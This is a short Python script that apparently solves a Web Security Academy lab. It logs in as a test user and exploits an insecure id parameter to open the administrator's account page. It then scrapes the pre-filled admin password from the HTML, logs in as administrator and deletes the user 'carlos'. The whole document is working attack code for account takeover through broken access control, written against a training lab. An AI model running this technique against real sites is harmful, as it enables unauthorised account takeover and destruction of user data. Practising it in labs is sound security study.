import requests
from bs4 import BeautifulSoup

s = requests.Session()
site = '0a6b002f035a1a3b80e1c62a007d001a.web-security-academy.net'

# Step 1: Login as wiener
login_url = f'https://{site}/login'
login_data = {'username': 'wiener', 'password': 'peter'}
s.post(login_url, data=login_data)

# Step 2: Visit the admin page using horizontal privilege escalation
admin_url = f'https://{site}/my-account?id=administrator'
resp = s.get(admin_url)

# Step 3: Parse and extract the pre-filled password
soup = BeautifulSoup(resp.text, 'html.parser')
admin_password = soup.find('input', {'name': 'password'}).get('value')
print(f"[+] Leaked admin password: {admin_password}")

# Step 4: Log in as administrator
login_data = {'username': 'administrator', 'password': admin_password}
s.post(login_url, data=login_data)

# Step 5: Delete carlos
delete_url = f'https://{site}/admin/delete?username=carlos'
resp = s.get(delete_url)
print("[+] Delete Carlos Response Code:", resp.status_code)

# Step 6: Check success
if "Congratulations" in resp.text:
    print("[+] Level Solved!")
else:
    print("[-] Something went wrong.")
